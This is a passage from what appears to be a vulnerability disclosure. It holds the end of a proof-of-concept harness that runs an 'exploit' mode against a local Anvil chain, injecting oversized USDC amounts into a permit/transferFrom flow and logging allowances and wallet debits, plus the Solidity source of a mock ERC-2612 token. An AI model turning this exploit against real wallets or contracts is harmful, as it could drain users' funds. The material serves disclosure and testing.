    } catch (e) {
      // A refused plan is the shape a ceiling produces. Report zeros; do not report nothing.
      results.push({ ...arm, permitValue: 0n, transferValue: 0n, allowanceAfter: 0n, debited: 0n, refused: String(e.message).slice(0, 80) })
      continue
    }
    results.push({ ...arm, permitValue, transferValue, allowanceAfter, debited })
  }
  return results
}

// ---------------------------------------------------------------------------- main
const mode = process.argv[2] ?? 'exploit'
const anvil = spawn(anvilBinary(), ['--port', String(PORT), '--chain-id', String(CHAIN_ID), '--silent'], {
  stdio: 'ignore',
  detached: false,
})
let results = []
let failure = null
try {
  await waitForChain()
  results = await run(mode)
} catch (e) {
  failure = e
} finally {
  try { anvil.kill('SIGKILL') } catch {}
}

console.log(`mode: ${mode}`)
console.log(`impact_row: 6285`)
console.log(`chain_is_local_anvil: 1`)
console.log(`permit_value_is_shortfall: ${permitValueIsShortfall}`)
console.log(`bounds_on_shortfall_before_permit: ${boundsOnShortfall}`)
console.log(`bounds_in_read_usdc_spend: ${boundsInReadUsdcSpend}`)
console.log(`session_stripped_at_entry: ${sessionStripped}`)
console.log(`dialog_money_render_sites: ${dialogMoneySites}`)
console.log(`sibling_dialog_money_render_sites: ${siblingMoneySites}`)
console.log(`vendor_recorded_live_fee_usdc: ${HONEST_FEE}`)
console.log(`chain_id: ${CHAIN_ID}`)
console.log(`dialog_lines: ${read(DIALOG).replace(/\n$/, '').split('\n').length}`)
console.log(`owner_branch_signature_bytes: ${ownerBranchSigBytes}`)
console.log(`owner_branch_policy_checks: ${ownerBranchPolicyChecks}`)
console.log(`injected_arm1_whole_usdc: 1000000`)
console.log(`injected_arm2_exponent_of_two: 200`)

if (failure) {
  console.log(`harness_error: ${failure.message}`)
  process.exit(1)
}

for (const r of results) {
  console.log(`injected_usdc_${r.tag}: ${r.usdc}`)
  console.log(`permit_value_${r.tag}: ${r.permitValue}`)
  console.log(`transferfrom_value_${r.tag}: ${r.transferValue}`)
  console.log(`onchain_allowance_${r.tag}: ${r.allowanceAfter}`)
  console.log(`wallet_debited_${r.tag}: ${r.debited}`)
  if (r.refused) console.log(`plan_refused_${r.tag}: ${r.refused}`)
}
process.exit(0)
```

### `poc-rig/Usdc6.sol`

Compiled with solc 0.8.36. The harness installs the compiled runtime code, which it carries inline as `USDC_RUNTIME`, so you do not need solc to run the PoC. This source is included so the token's behaviour can be audited.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// A real ERC-2612 token, address-independent so its runtime code can be
/// installed at the manifest's USDC address on a local chain.
contract Usdc6 {
    string public constant name = "USDC";
    string public constant version = "2";
    uint8 public constant decimals = 6;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public nonces;

    bytes32 private constant PERMIT_TYPEHASH =
        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 private constant DOMAIN_TYPEHASH =
        keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function DOMAIN_SEPARATOR() public view returns (bytes32) {
        return keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), keccak256(bytes(version)), block.chainid, address(this)));
    }

    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
        require(block.timestamp <= deadline, "EIP2612: expired");
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR(),
            keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))));
        address rec = ecrecover(digest, v, r, s);
        require(rec != address(0) && rec == owner, "EIP2612: invalid signature");
        allowance[owner][spender] = value;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allowance");
        if (a != type(uint256).max) { allowance[from][msg.sender] = a - amount; }
        require(balanceOf[from] >= amount, "balance");
        unchecked { balanceOf[from] -= amount; balanceOf[to] += amount; }
        return true;
    }
}
```
